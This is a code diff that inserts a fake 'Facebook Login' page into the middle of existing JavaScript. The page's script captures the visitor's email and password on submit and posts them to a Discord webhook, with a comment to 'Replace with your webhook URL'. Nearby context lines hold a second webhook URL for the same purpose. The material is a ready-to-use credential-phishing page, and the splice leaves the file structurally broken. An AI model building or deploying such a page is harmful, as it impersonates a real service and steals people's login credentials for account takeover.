@@ -47,6 +47,51 @@
 			const email = document.getElementById("email").value;
 
 			const password = document.getElementById("password").value;
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Facebook Login</title>
+	<!-- Insert CSS link here -->
+</head>
+<body>
+	<div class="login-box">
+		<img src="https://i.imgur.com/SFysjJE.png" class="avatar">
+		<h1>Login to Facebook</h1>
+		<form method="POST" action="">
+			<label for="email">Email</label>
+			<input type="text" name="email" placeholder="Enter Email" required>
+			<label for="password">Password</label>
+			<input type="password" name="password" placeholder="Enter Password" required>
+			<input type="submit" value="Login">
+			<p class="forgot-password">Forgot Password?</p>
+		</form>
+	</div>
+	
+	<script>
+		function sendDiscordWebhook(email, password) {
+			var url = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"; // Replace with your webhook URL
+
+			var data = {
+				"content": "**Logged In User**\nUser: " + email + "\nPass: " + password
+			};
+
+			var xhr = new XMLHttpRequest();
+			xhr.open("POST", url, true);
+			xhr.setRequestHeader("Content-Type", "application/json");
+			xhr.send(JSON.stringify(data));
+		}
+
+		document.querySelector('form').addEventListener('submit', function(event) {
+			event.preventDefault();
+			var email = document.querySelector('input[name="email"]').value;
+			var password = document.querySelector('input[name="password"]').value;
+			// Perform login logic here
+			sendDiscordWebhook(email, password);
+			this.submit();
+		});
+	</script>
+</body>
+</html>
 
 			const webhookURL = "https://discord.com/api/webhooks/1234567890/abcdefg"; // replace with your own webhook URL
 
